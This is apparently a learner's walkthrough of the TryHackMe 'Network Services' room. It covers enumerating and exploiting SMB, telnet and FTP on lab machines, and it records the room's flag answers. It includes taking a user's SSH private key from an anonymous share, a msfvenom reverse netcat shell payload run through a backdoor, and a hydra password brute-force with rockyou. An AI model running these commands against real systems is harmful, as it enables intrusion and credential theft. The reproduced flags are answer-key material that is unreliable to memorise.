# NetworkServices
https://tryhackme.com/room/networkservices

## Task 1: Get connected
``sudo openvpn /root/Downloads/Basilisco585THM.ovpn``

## Task 2: Understanding SMB
  
- What does SMB stand for?	``Server Message Block``
- What type of protocol is SMB?	``response-request``
- What do clients connect to servers using?	``TCP/IP``
- What systems does Samba run on? 	``Unix``

## Task 3: Enumerating SMB
Deploy the machine.

``nmap -sC -sV -A 10.10.116.16``

``perl enum4linux.pl -A -a 10.10.116.16``
- Conduct an **nmap** scan of your choosing, How many ports are open?	``3``
````
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
````
- What ports is **SMB** running on?	``139/445``
- Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the **workgroup** name?	``WORKGROUP``  
although enum4linux outputs this ``SMB1 disabled -- no workgroup available`` in nmap there is the workgroup name specified
````
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
````

- What comes up as the **name** of the machine? 	``polosmb``
```` FROM NMAP OUTPUT
Host script results:
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: polosmb
|   NetBIOS computer name: POLOSMB\x00
|   Domain name: \x00
|   FQDN: polosmb
|_  System time: 2021-08-06T08:09:37+00:00
````
- What operating system **version** is running?	 ``6.1``  
 ``OS: Windows 6.1 (Samba 4.7.6-Ubuntu)``
- What share sticks out as something we might want to investigate?	 ``profiles``

## Task 4: Exploiting SMB
````
 ============( Share Enumeration on 10.10.116.16 )============
 	    Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))

````
Those are the list of shares that we enumerated: ``smbclient //[IP]/[SHARE] -U [NAME] -p [PORT]``

- What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?	``smbclient //10.10.10.2/secret -u suit -p 139``
-  Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability. 	``no answer needed``
-  Does the share allow anonymous access? Y/N?	``Y``
-  Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?	``John Cactus``
	
````
❯ smbclient //10.10.116.16/profiles -u Anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 21 07:08:23 2020
  ..                                  D        0  Tue Apr 21 06:49:56 2020
  .cache                             DH        0  Tue Apr 21 07:08:23 2020
  .profile                            H      807  Tue Apr 21 07:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020

````

we see that there is an interesting file, can we open it with ``print``? Nope, lets send it to our machine.  
````
smb: \> get "Working From Home Information.txt" /root/hola.txt
getting file \Working From Home Information.txt of size 358 as /root/hola.txt (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
-------------------------------------------------------------------------
❯ cat hola.txt
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 
````

- What service has been configured to allow him to work from home? ``ssh``
- Okay! Now we know this, what directory on the share should we look in? ``.ssh``
- This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?	``id_rsa``
````
smb: \.ssh\> mget id_rsa* 
getting file \.ssh\id_rsa of size 1679 as /root/id_rsapolosmb3 (10.2 KiloBytes/sec) (average 6.2 KiloBytes/sec)
getting file \.ssh\id_rsa.pub of size 396 as /root/idpublica (2.5 KiloBytes/sec) (average 5.0 KiloBytes/sec)
-------------------------------------------------------------------------
❯ /bin/cat idpublica
ssh-rsa BLABLABLA --> cactus@polosmb that is the username for the ssh
❯ ssh cactus@10.10.116.16 -i id_rsa
-------------------------------------------------------------------------
cactus@polosmb:~$ cat smb.txt 
THM{smb_is_fun_eh?}
````
- What is the smb.txt flag? ``THM{smb_is_fun_eh?}``

## Task 5: Understanding Telnet
- What is Telnet?	``application protocol``
- What has slowly replaced Telnet?	``ssh``
- How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?	``telnet 10.10.10.3 23``
- The lack of what, means that all Telnet communication is in plaintext? 	``encryption``

## Task 6: Enumerating Telnet
We run nmap
````
❯ nmap -sC -sV -A 10.10.17.203
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 06:23 EDT
Nmap scan report for 10.10.17.203 (10.10.17.203)
Host is up (0.039s latency).
All 1000 scanned ports on 10.10.17.203 (10.10.17.203) are closed
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   36.17 ms 10.11.0.1 (10.11.0.1)
2   36.21 ms 10.10.17.203 (10.10.17.203)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
-------------------------------------------------------------------------                                                                                          
❯ nmap -sC -sV -A 10.10.17.203 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 06:23 EDT
Nmap scan report for 10.10.17.203 (10.10.17.203)
Host is up (0.038s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
8012/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.91%I=7%D=8/6%Time=610D0DBB%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands
SF:\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x
SF:20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x

````

-  How many **ports** are open on the target machine?	``1``
- What **port** is this?	``8012``
- This port is unassigned, but still lists the **protocol** it's using, what protocol is this?	``tcp``
- Now re-run the **nmap** scan, without the **-p-** tag, how many ports show up as open?	``0``
- Based on the title returned to us, what do we think this port could be **used for**? 	``a backdoor``
- Who could it belong to? Gathering possible **usernames** is an important step in enumeration.	``skidy``

## Task 7: Exploiting Telnet
````
❯ telnet 10.10.17.203 8012
Trying 10.10.17.203...
Connected to 10.10.17.203.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
ls 
.HELP
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit

````
- Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.	``No answer needed``
- Great! It's an open telnet connection! What welcome message do we receive? ``SKIDY'S BACKDOOR.``
- Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)	``y``
- Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. ``No answer needed``  
``.RUN ls`` --> doesn't output anything

- This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.	``No answer needed``
-   Now, use the command **"ping [local THM ip] -c 1"** through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)	``y``
````
.RUN icmp -i eth0
-------------------------------------------------------------------------
❯ tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
06:36:08.801617 IP kali.53430 > 10.10.17.203.8012: Flags [P.], seq 4120330186:4120330205, ack 1028418728, win 502, options [nop,nop,TS val 851729200 ecr 2962480327], length 19
06:36:08.838120 IP 10.10.17.203.8012 > kali.53430: Flags [.], ack 19, win 490, options [nop,nop,TS val 2962637955 ecr 851729200], length 0
````

- Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!	``No answer needed``
- What word does the generated payload start with? 	``mkfifo``
````
❯ msfvenom -p cmd/unix/reverse_netcat lhost=10.11.38.54 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 97 bytes
mkfifo /tmp/xoerbw; nc 10.11.38.54 4444 0</tmp/xoerbw | /bin/sh >/tmp/xoerbw 2>&1; rm /tmp/xoerbw
````
- What would the command look like for the listening port we selected in our payload?	``nc -lvp 4444``
- Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine! ``No answer needed``

````
.RUN mkfifo /tmp/xoerbw; nc 10.11.38.54 4444 0</tmp/xoerbw | /bin/sh >/tmp/xoerbw 2>&1; rm /tmp/xoerbw
-------------------------------------------------------------------------
❯ nc -lvp 4444
listening on [any] 4444 ...
10.10.17.203: inverse host lookup failed: Unknown host
connect to [10.11.38.54] from (UNKNOWN) [10.10.17.203] 46820                               
                                             
cat flag.txt
THM{y0u_g0t_th3_t3ln3t_fl4g} 
````
- Success! What is the contents of flag.txt? ``THM{y0u_g0t_th3_t3ln3t_fl4g}``

## Task 8: Understanding FTP
- What communications model does FTP use?	``client-server``
- What's the standard FTP port?	``21``
- How many modes of FTP connection are there?	``2``

## Task 9: Enumerating FTP
````
❯ nmap -sC -sV -A 10.10.113.139 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 06:50 EDT
Nmap scan report for 10.10.113.139 (10.10.113.139)
Host is up (0.037s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.38.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

````

- How many **ports** are open on the target machine?	``2`` Note: seemed 1 but ok
- What **port** is ftp running on?	``21``
- What **variant** of FTP is running on it?	``vsftp``
- What is the name of the file in the anonymous FTP directory?	``PUBLIC_NOTICE.txt``
-  What do we think a possible username could be?	``Mike``

````
❯ /bin/cat PUBLIC_NOTICE.txt
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
````
-   Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that... ``No answer needed``

## Task 10: Exploiting FTP
````
❯ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.113.139 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-06 07:00:37
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ftp://10.10.113.139:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.113.139 - login "mike" - pass "123456" - 1 of 14344398 [child 0] (0/0)
[ATTEMPT] target 10.10.113.139 - login "mike" - pass "12345" - 2 of 14344398 [child 1] (0/0)
[ATTEMPT] target 10.10.113.139 - login "mike" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
[ATTEMPT] target 10.10.113.139 - login "mike" - pass "password" - 4 of 14344398 [child 3] (0/0)
[21][ftp] host: 10.10.113.139   login: mike   password: password
[STATUS] attack finished for 10.10.113.139 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-06 07:00:42
````

- What is the password for the user "mike"?	``password``
- Bingo! Now, let's connect to the FTP server as this user using **"ftp [IP]"** and entering the credentials when prompted	``No answer needed``
- What is ftp.txt?	``THM{y0u_g0t_th3_ftp_fl4g}``

````
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
226 Transfer complete.
26 bytes received in 0.00 secs (564.2361 kB/s)
-------------------------------------------------------------------------
❯ cat ftp.txt
THM{y0u_g0t_th3_ftp_fl4g}
````
